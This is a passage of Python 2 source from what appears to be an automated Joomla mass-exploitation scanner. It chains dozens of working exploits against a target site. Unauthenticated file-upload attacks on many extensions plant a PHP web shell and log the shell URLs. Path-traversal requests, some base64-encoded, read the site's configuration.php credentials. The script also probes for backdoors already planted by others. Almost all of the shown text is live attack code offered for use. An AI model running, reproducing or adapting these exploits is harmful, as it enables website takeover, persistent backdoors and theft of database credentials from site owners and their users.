			open('Vulns/Shells.txt', 'a').write(url+'/components/com_b2jcontact/root.php'+'\n')
			sys.exit()
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} com_b2jcontact     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
		
		
		# 6 .   Gravity Forms
		
		
		
		
		lGravkreq = requests.post(url+'/index.php?option=com_b2jcontact&view=loader&type=uploader&owner=component&bid=1&qqfile=/../../../root.php', data=shell_2)
		
		lGravklib = requests.get(url+'/components/root.php?bang')
		
		
		if 'Bigbang' in lGravklib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_b2jcontact 2     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",lGravklib.content)
			token = xshell_path[0]
			Check = token.replace("[", "")
			Check1 = Check.replace("]", "")
			open('Vulns/joomlashell.txt', 'a').write(url+'/components/root.php?bang'+'\n'+Check1+'\n\n')
			open('Vulns/Shells.txt', 'a').write(url+'/components/root.php'+'\n')
			sys.exit()
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} com_b2jcontact 2     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
		
			
			
		# 7 . Reflex Gallery
		
		Reflexup = {'files[]' : open(jceupshell, 'rb')}
		
		Reflexreq = requests.post(url+'/com_sexycontactform/fileupload/index.php', files=Reflexup)
		
		Reflexlib = requests.get(url+'/com_sexycontactform/fileupload/files/root.php?shell')
		
		
		if 'Bigbang' in Reflexlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_sexycontactform     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",Reflexlib.content)
			token = xshell_path[0]
			Check = token.replace("[", "")
			Check1 = Check.replace("]", "")
			open('Vulns/joomlashell.txt', 'a').write(url+'/com_sexycontactform/fileupload/files/root.php?shell'+'\n'+Check1+'\n\n')
			open('Vulns/Shells.txt', 'a').write(url+'/com_sexycontactform/fileupload/files/root.php'+'\n')
			sys.exit()
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} com_sexycontactform     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
		
		
			
		# 8 . copysafe
			
		
		
		check_myblog = requests.get(url+'/index.php?option=com_myblog&task=ajaxupload')
			
		if "{error: 'No file" in check_myblog.content:
			
			print '{}[+]: {} {}   ====> {}{}  CoM_myblog  {}{} Vuln  '.format(sb, sd, url, fc,fc, sb,fg)
				
			image_myblog = "root.php.xxxjpg"
				
			com_myb = {'fileToUpload':(image_myblog, shell_2)}
				
			req_myblog = requests.post(url+'/index.php?option=com_myblog&task=ajaxupload', files=com_myb)
				
			shell_path = re.findall("source: '(.*?)'",req_myblog.content)
				
				
			site = shell_path[0]
				
			
			check_shell = requests.get(site)
				
				
			if 'Bigbang' in check_shell.content:
				print '{}[Joomla]: {} {}   ====> {}{}  CoM_myblog   {}{} eXploiting Done  '.format(sb, sd, url, fc,fc, sb,fg)
				open('Vulns/Shells.txt', 'a').write(site+'\n')
					
			else:
				print '{}[Joomla]: {} {}   ====> {}{}  CoM_myblog  {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
					
				
		else:
			print '{}[Joomla]: {} {}   ====> {}{}  CoM_myblog  {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)		

		
		# 9 . Cherry
		
		bappgrav  = {'jpath':'..%2F..%2F..%2F..%2F'}
		
		
		bGrav = {'Filedata':(zat, shell_2, 'text/html')}
		
		bGravreq = requests.post(url+'/administrator/components/com_rokdownloads/assets/uploadhandler.php', data=bappgrav, files=bGrav)
		
		bGravlib = requests.get(url+'/images/stories/root.php.xxxjpg?bang')
		
		
		if 'Bigbang' in bGravlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_rokdownloads     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
		        xshell_path = re.findall("uname(.*?)/uname",bGravlib.content)
			token = xshell_path[0]
			Check = token.replace("[", "")
			Check1 = Check.replace("]", "")
			open('Vulns/joomlashell.txt', 'a').write(url+'/images/stories/xx.php.xxxjpg?bang'+'\n'+Check1+'\n\n')
			open('Vulns/Shells.txt', 'a').write(url+'/images/stories/xx.php.xxxjpg'+'\n')
			sys.exit()
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} com_rokdownloads     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

		
		# 9 . Cherry
		
		dsbappgrav  = {'jpath':'..%2F..%2F..%2F..%2F'}
		
		
		dsbGrav = {'file':(zat, shell_2, 'text/html')}
		
		dsbGravreq = requests.post(url+'/administrator/components/com_simplephotogallery/lib/uploadFile.php', data=dsbappgrav, files=dsbGrav)
		
		dsbGravlib = requests.get(url+'/root.php.xxxjpg?bang')
		
		
		if 'Bigbang' in dsbGravlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_simplephotogallery     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",dsbGravlib.content)
			token = xshell_path[0]
			Check = token.replace("[", "")
			Check1 = Check.replace("]", "")
			open('Vulns/joomlashell.txt', 'a').write(url+'/root.php.xxxjpg?bang'+'\n'+Check1+'\n\n')
			open('Vulns/Shells.txt', 'a').write(url+'/root.php.xxxjpg'+'\n')
			sys.exit()
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} com_simplephotogallery     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

	
		
		# 10 . Cherry
		
		
		
		cbGrav = {'Filedata':(zat, shell_2, 'text/html')}
		
		cbGravreq = requests.post(url+'/administrator/components/com_extplorer/uploadhandler.php', files=cbGrav)
		
		cbGravlib = requests.get(url+'/images/stories/root.php.xxxjpg')
		
		
		if 'Bigbang' in cbGravlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_extplorer     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",cbGravlib.content)
			token = xshell_path[0]
			Check = token.replace("[", "")
			Check1 = Check.replace("]", "")
			open('Vulns/joomlashell.txt', 'a').write(url+'/images/stories/root.php.xxxjpg?bang'+'\n'+Check1+'\n\n')
			open('Vulns/Shells.txt', 'a').write(url+'/images/stories/root.php.xxxjpg'+'\n')
			sys.exit()
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} com_extplorer     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

		
		# 10 . Cherry
		
		
		
		cbGrav = {'Filedata': open(jceupshell, 'rb')}
		
		cbGravreq = requests.post(url+'/modules/megamenu/uploadify/uploadify.php?folder=modules/megamenu/uploadify/"', files=cbGrav)
		
		cbGravlib = requests.get(url+'/modules/megamenu/uploadify/root.php?shell')
		
		
		if 'Bigbang' in cbGravlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} mega menu     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",cbGravlib.content)
			token = xshell_path[0]
			Check = token.replace("[", "")
			Check1 = Check.replace("]", "")
			open('Vulns/joomlashell.txt', 'a').write(url+'/modules/megamenu/uploadify/root.php?shell'+'\n'+Check1+'\n\n')
			open('Vulns/Shells.txt', 'a').write(url+'/modules/megamenu/uploadify/root.php'+'\n')
			sys.exit()
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} mega menu     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
			
		# 11 . Reflex Gallery
		
		eReflexup = {'file' : open(jceupshell, 'rb')}
		
		eReflexreq = requests.post(url+'/modules/mod_simplefileuploadv1.3/elements/udd.php', files=eReflexup)
		
		eReflexlib = requests.get(url+'/modules/mod_simplefileuploadv1.3/elements/root.php?shell')
		
		
		if 'Bigbang' in eReflexlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} mod_simplefileupload     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",eReflexlib.content)
			token = xshell_path[0]
			Check = token.replace("[", "")
			Check1 = Check.replace("]", "")
			open('Vulns/joomlashell.txt', 'a').write(url+'/modules/mod_simplefileuploadv1.3/elements/root.php?shell'+'\n'+Check1+'\n\n')
			open('Vulns/Shells.txt', 'a').write(url+'/modules/mod_simplefileuploadv1.3/elements/root.php'+'\n')
			sys.exit()
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} mod_simplefileupload     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
			
			
		# 12 . Reflex Gallery
		
		feReflexup = {'Filedata' : open(jceupshell, 'rb')}
		
		feReflexreq = requests.post(url+'/administrator/components/com_bt_portfolio/helpers/uploadify/uploadify.php', files=feReflexup)
		
		feReflexlib = requests.get(url+'/administrator/components/com_bt_portfolio/root.php?shell')
		
		
		if 'Bigbang' in feReflexlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_bt_portfolio     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",feReflexlib.content)
			token = xshell_path[0]
			Check = token.replace("[", "")
			Check1 = Check.replace("]", "")
			open('Vulns/joomlashell.txt', 'a').write(url+'/administrator/components/com_bt_portfolio/root.php?shell'+'\n'+Check1+'\n\n')
			open('Vulns/Shells.txt', 'a').write(url+'/administrator/components/com_bt_portfolio/root.php'+'\n')
			sys.exit()
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} com_bt_portfolio     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)				


		# 13 . Reflex Gallery
		
		zfeReflexup = {'file' : open(jceupshell, 'rb')}
		
		zfeReflexreq = requests.post(url+'/index.php?option=com_jwallpapers&task=upload', files=zfeReflexup)
		
		zfeReflexlib = requests.get(url+'/jwallpapers_files/plupload/root.php?shell')
		
		
		if 'Bigbang' in zfeReflexlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_jwallpapers     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",zfeReflexlib.content)
			token = xshell_path[0]
			Check = token.replace("[", "")
			Check1 = Check.replace("]", "")
			open('Vulns/joomlashell.txt', 'a').write(url+'/jwallpapers_files/plupload/root.php?shell'+'\n'+Check1+'\n\n')
			open('Vulns/Shells.txt', 'a').write(url+'/jwallpapers_files/plupload/root.php'+'\n')
			sys.exit()
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} com_jwallpapers     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	


		# 14 . Reflex Gallery
		
		
		dzfeReflexreq = requests.post(url+'/administrator/components/com_redmystic/chart/ofc-library/ofc_upload_image.php?name=root.php', data=shell_2)
		
		dzfeReflexlib = requests.get(url+'/administrator/components/com_redmystic/chart/tmp-upload-images/root.php?bang')
		
		
		if 'Bigbang' in dzfeReflexlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_redmystic     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",dzfeReflexlib.content)
			token = xshell_path[0]
			Check = token.replace("[", "")
			Check1 = Check.replace("]", "")
			open('Vulns/joomlashell.txt', 'a').write(url+'/administrator/components/com_redmystic/chart/tmp-upload-images/root.php?bang'+'\n'+Check1+'\n\n')
			open('Vulns/Shells.txt', 'a').write(url+'/administrator/components/com_redmystic/chart/tmp-upload-images/root.php'+'\n')
			sys.exit()
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} com_redmystic     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


		# 15 . Reflex Gallery
		
		xbappgrav  = {'folder':'/components/com_facileforms/libraries/jquery/'}
		
		nzfeReflexup = {'Filedata' : open(jceupshell, 'rb')}
		
		nzfeReflexreq = requests.post(url+'/components/com_facileforms/libraries/jquery/uploadify.php', data=xbappgrav, files=nzfeReflexup)
		
		nzfeReflexlib = requests.get(url+'/components/com_facileforms/libraries/jquery/root.php?shell')
		
		
		if 'Bigbang' in nzfeReflexlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_facileforms     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",nzfeReflexlib.content)
			token = xshell_path[0]
			Check = token.replace("[", "")
			Check1 = Check.replace("]", "")
			open('Vulns/joomlashell.txt', 'a').write(url+'/components/com_facileforms/libraries/jquery/root.php?shell'+'\n'+Check1+'\n\n')
			open('Vulns/Shells.txt', 'a').write(url+'/components/com_facileforms/libraries/jquery/root.php'+'\n')
			sys.exit()
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} com_facileforms     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

		
		# 16 .   Gravity Forms
		

		wGravkreq = requests.post(url+'/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/php-ofc-library/ofc_upload_image.php?name=root.php', data=shell_2)
		
		wGravklib = requests.get(url+'/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/tmp-upload-images/root.php?bang')
		
		
		if 'Bigbang' in wGravklib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_civicrm     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",wGravklib.content)
			token = xshell_path[0]
			Check = token.replace("[", "")
			Check1 = Check.replace("]", "")
			open('Vulns/joomlashell.txt', 'a').write(url+'/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/tmp-upload-images/root.php?bang'+'\n'+Check1+'\n\n')
			open('Vulns/Shells.txt', 'a').write(url+'/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/tmp-upload-images/root.php'+'\n')
			sys.exit()
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} com_civicrm     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

		
		# 16 .   Gravity Forms
		

		ewGravkreq = requests.post(url+'/administrator/components/com_maian15/charts/php-ofc-library/ofc_upload_image.php?name=root.php', data=shell_2)
		
		ewGravklib = requests.get(url+'/administrator/components/com_maian15/charts/tmp-upload-images/root.php?bang')
		
		
		if 'Bigbang' in ewGravklib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_maian15     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",ewGravklib.content)
			token = xshell_path[0]
			Check = token.replace("[", "")
			Check1 = Check.replace("]", "")
			open('Vulns/joomlashell.txt', 'a').write(url+'/administrator/components/com_maian15/charts/tmp-upload-images/root.php?bang'+'\n'+Check1+'\n\n')
			open('Vulns/Shells.txt', 'a').write(url+'/administrator/components/com_maian15/charts/tmp-upload-images/root.php'+'\n')
			sys.exit()
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} com_maian15     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

		
		
		# 17 .   Gravity Forms
		

		
		awGravkreq = requests.post(url+'/administrator/components/com_acymailing/inc/openflash/php-ofc-library/ofc_upload_image.php?name=root.php', data=shell_2)
		
		awGravklib = requests.get(url+'/administrator/components/com_acymailing/inc/openflash/tmp-upload-images/root.php?bang')
		
		
		if 'Bigbang' in awGravklib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_acymailing     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",awGravklib.content)
			token = xshell_path[0]
			Check = token.replace("[", "")
			Check1 = Check.replace("]", "")
			open('Vulns/joomlashell.txt', 'a').write(url+'/administrator/components/com_acymailing/inc/openflash/tmp-upload-images/root.php?bang'+'\n'+Check1+'\n\n')
			open('Vulns/Shells.txt', 'a').write(url+'/administrator/components/com_acymailing/inc/openflash/tmp-upload-images/root.php'+'\n')
			sys.exit()
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} com_acymailing     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
		
		# 18 .   Gravity Forms
		

		
		dawGravkreq = requests.post(url+'/administrator/components/com_jnewsletter/includes/openflashchart/php-ofc-library/ofc_upload_image.php?name=root.php', data=shell_2)
		
		dawGravklib = requests.get(url+'/administrator/components/com_jnewsletter/includes/openflashchart/tmp-upload-images/root.php?bang')
		
		
		if 'Bigbang' in dawGravklib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_jnewsletter     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",dawGravklib.content)
			token = xshell_path[0]
			Check = token.replace("[", "")
			Check1 = Check.replace("]", "")
			open('Vulns/joomlashell.txt', 'a').write(url+'/administrator/components/com_jnewsletter/includes/openflashchart/tmp-upload-images/root.php?bang'+'\n'+Check1+'\n\n')
			open('Vulns/Shells.txt', 'a').write(url+'/administrator/components/com_jnewsletter/includes/openflashchart/tmp-upload-images/root.php'+'\n')
			sys.exit()
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} com_jnewsletter     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
		
		# 19 .   Gravity Forms
		

		
		xdawGravkreq = requests.post(url+'/administrator/components/com_jinc/classes/graphics/php-ofc-library/ofc_upload_image.php?name=root.php', data=shell_2)
		
		xdawGravklib = requests.get(url+'/administrator/components/com_jinc/classes/graphics/tmp-upload-images/root.php?bang')
		
		
		if 'Bigbang' in xdawGravklib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_jinc     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",xdawGravklib.content)
			token = xshell_path[0]
			Check = token.replace("[", "")
			Check1 = Check.replace("]", "")
			open('Vulns/joomlashell.txt', 'a').write(url+'/administrator/components/com_jinc/classes/graphics/tmp-upload-images/root.php?bang'+'\n'+Check1+'\n\n')
			open('Vulns/Shells.txt', 'a').write(url+'/administrator/components/com_jinc/classes/graphics/tmp-upload-images/root.php'+'\n')
			sys.exit()
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} com_jinc     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
		
		# 20 .   Gravity Forms
		

		
		zxdawGravkreq = requests.post(url+'/administrator/components/com_maianmedia/utilities/charts/php-ofc-library/ofc_upload_image.php?name=root.php', data=shell_2)
		
		zxdawGravklib = requests.get(url+'/administrator/components/com_maianmedia/utilities/charts/tmp-upload-images/root.php?bang')
		
		
		if 'Bigbang' in zxdawGravklib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_maianmedia     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",zxdawGravklib.content)
			token = xshell_path[0]
			Check = token.replace("[", "")
			Check1 = Check.replace("]", "")
			open('Vulns/joomlashell.txt', 'a').write(url+'/administrator/components/com_maianmedia/utilities/charts/tmp-upload-images/root.php?bang'+'\n'+Check1+'\n\n')
			open('Vulns/Shells.txt', 'a').write(url+'/administrator/components/com_maianmedia/utilities/charts/tmp-upload-images/root.php'+'\n')
			sys.exit()
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} com_maianmedia     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
		
		# 21 .   Gravity Forms
		

		
		szxdawGravkreq = requests.post(url+'/administrator/components/com_jnews/includes/openflashchart/php-ofc-library/ofc_upload_image.php?name=root.php', data=shell_2)
		
		mzxdawGravklib = requests.get(url+'/administrator/components/com_jnews/includes/openflashchart/tmp-upload-images/root.php?bang')
		
		
		if 'Bigbang' in mzxdawGravklib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_jnews     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",mzxdawGravklib.content)
			token = xshell_path[0]
			Check = token.replace("[", "")
			Check1 = Check.replace("]", "")
			open('Vulns/joomlashell.txt', 'a').write(url+'/administrator/components/com_jnews/includes/openflashchart/tmp-upload-images/root.php?bang'+'\n'+Check1+'\n\n')
			open('Vulns/Shells.txt', 'a').write(url+'/administrator/components/com_jnews/includes/openflashchart/tmp-upload-images/root.php'+'\n')
			sys.exit()
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} com_jnews     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			



		
		# 22 . rev
		
		xcrevlib = requests.get(url+"/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php")
				
		if 'JConfig' in xcrevlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_hdflvplayer     {}{} Success  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Config.txt', 'a').write(url+'/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php'+'\n')
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} com_hdflvplayer     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)				

		
		# 23 . rev
		
		aaxcrevlib = requests.get(url+"/index.php?jat3action=gzip&type=css&file=configuration.php")
				
		if 'JConfig' in aaxcrevlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} jat3action     {}{} Success  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Config.txt', 'a').write(url+'/index.php?jat3action=gzip&type=css&file=configuration.php'+'\n')
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} jat3action     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
		
		# 24 . rev
		
		Caaxcrevlib = requests.get(url+"/modules/mod_dvfoldercontent/download.php?f=Li4vLi4vY29uZmlndXJhdGlvbi5waHA=")
				
		if 'JConfig' in Caaxcrevlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} mod_dvfoldercontent     {}{} Success  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Config.txt', 'a').write(url+'/modules/mod_dvfoldercontent/download.php?f=Li4vLi4vY29uZmlndXJhdGlvbi5waHA='+'\n')
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} mod_dvfoldercontent     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


		# 25 . rev
		
		aCaaxcrevlib = requests.get(url+"/plugins/content/jw_allvideos/includes/download.php?file=../../../../configuration.php")
				
		if 'JConfig' in aCaaxcrevlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} jw_allvideos     {}{} Success  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Config.txt', 'a').write(url+'/plugins/content/jw_allvideos/includes/download.php?file=../../../../configuration.php'+'\n')
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} jw_allvideos     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)



		# 26 . rev
		
		daCaaxcrevlib = requests.get(url+"/index.php?option=com_product_modul&task=download&file=../../../../../configuration.php&id=1&Itemid=1")
				
		if 'JConfig' in daCaaxcrevlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_product_modul     {}{} Success  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Config.txt', 'a').write(url+'/index.php?option=com_product_modul&task=download&file=../../../../../configuration.php&id=1&Itemid=1'+'\n')
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} com_product_modul     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			



		# 27 . rev
		
		xdaCaaxcrevlib = requests.get(url+"/index.php?option=com_cckjseblod&task=download&file=configuration.php")
				
		if 'JConfig' in xdaCaaxcrevlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_cckjseblod     {}{} Success  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Config.txt', 'a').write(url+'/index.php?option=com_cckjseblod&task=download&file=configuration.php'+'\n')
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} com_cckjseblod     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


		# 28 . rev
		
		rxdaCaaxcrevlib = requests.get(url+"/components/com_contushdvideoshare/hdflvplayer/download.php?f=../../../configuration.php")
				
		if 'JConfig' in rxdaCaaxcrevlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_contushdvideoshare     {}{} Success  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Config.txt', 'a').write(url+'/components/com_contushdvideoshare/hdflvplayer/download.php?f=../../../configuration.php'+'\n')
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} com_contushdvideoshare     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


		# 29 . rev
		
		trxdaCaaxcrevlib = requests.get(url+"/index.php?option=com_community&view=groups&groupid=1&task=app&app=groupfilesharing&do=download&file=../../../../configuration.php&Itemid=0")
				
		if 'JConfig' in trxdaCaaxcrevlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_community     {}{} Success  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Config.txt', 'a').write(url+'/index.php?option=com_community&view=groups&groupid=1&task=app&app=groupfilesharing&do=download&file=../../../../configuration.php&Itemid=0'+'\n')
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} com_community     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			


		# 30 . rev
		
		yrxdaCaaxcrevlib = requests.get(url+"/administrator/components/com_aceftp/quixplorer/index.php?action=download&dir=&item=configuration.php&order=name&srt=yes")
				
		if 'JConfig' in yrxdaCaaxcrevlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_aceftp     {}{} Success  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Config.txt', 'a').write(url+'/administrator/components/com_aceftp/quixplorer/index.php?action=download&dir=&item=configuration.php&order=name&srt=yes'+'\n')
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} com_aceftp     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


		# 31 . rev
		
		ayrxdaCaaxcrevlib = requests.get(url+"/plugins/content/s5_media_player/helper.php?fileurl=Li4vLi4vLi4vY29uZmlndXJhdGlvbi5waHA=")
				
		if 'JConfig' in ayrxdaCaaxcrevlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} s5_media_player     {}{} Success  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Config.txt', 'a').write(url+'/plugins/content/s5_media_player/helper.php?fileurl=Li4vLi4vLi4vY29uZmlndXJhdGlvbi5waHA='+'\n')
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} s5_media_player     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


		# 32 . rev
		
		cayrxdaCaaxcrevlib = requests.get(url+"/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php")
				
		if 'JConfig' in cayrxdaCaaxcrevlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_joomanager     {}{} Success  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Config.txt', 'a').write(url+'/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php'+'\n')
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} com_joomanager     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


		# 33 . rev
		
		rcayrxdaCaaxcrevlib = requests.get(url+"/plugins/content/wd/wddownload.php?download=wddownload.php&file=../../../configuration.php")
				
		if 'JConfig' in rcayrxdaCaaxcrevlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} wddownload     {}{} Success  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Config.txt', 'a').write(url+'/plugins/content/wd/wddownload.php?download=wddownload.php&file=../../../configuration.php'+'\n')
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} wddownload     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
		
		req_xxmyblog = requests.get(url+'/administrator/index.php')
				
		xshell_path = re.findall('name="(.*)" value="1"',req_xxmyblog.content)

		token = xshell_path[0]
  
		
		nncayrxdaCaaxcrevlib = requests.get(url+"/index.php?option=com_k2&view=media&task=connector&cmd=file&target=l1_Li4vY29uZmlndXJhdGlvbi5waHA=&download=1&token=1")
				
		if 'JConfig' in nncayrxdaCaaxcrevlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_k2     {}{} Success  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Config.txt', 'a').write(url+'/index.php?option=com_k2&view=media&task=connector&cmd=file&target=l1_Li4vY29uZmlndXJhdGlvbi5waHA=&download=1&token=1'+'\n')
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} com_k2     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			
			
		# 35 . rev
		
		zrcayrxdaCaaxcrevlib = requests.get(url+"/index.php?option=com_macgallery&view=download&albumid=../../configuration.php")
				
		if 'JConfig' in zrcayrxdaCaaxcrevlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_macgallery     {}{} Success  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Config.txt', 'a').write(url+'/index.php?option=com_macgallery&view=download&albumid=../../configuration.php'+'\n')
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} com_macgallery     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)



			
		# 35 . rev
		
		anGravlib = requests.get(url+'/shell.php')		
		anxxGravlib = requests.get(url+'/media/error.php')
		anxxxGravlib = requests.get(url+'/media/shell.php')
		anxxxxGravlib = requests.get(url+'/images/shell.php')
		anxxxxxGravlib = requests.get(url+'/098.php')
		
		
		if 'Uname' in anGravlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} Shell     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/shell.php'+'\n')
			sys.exit()
		elif 'Uname' in anxxGravlib.content:
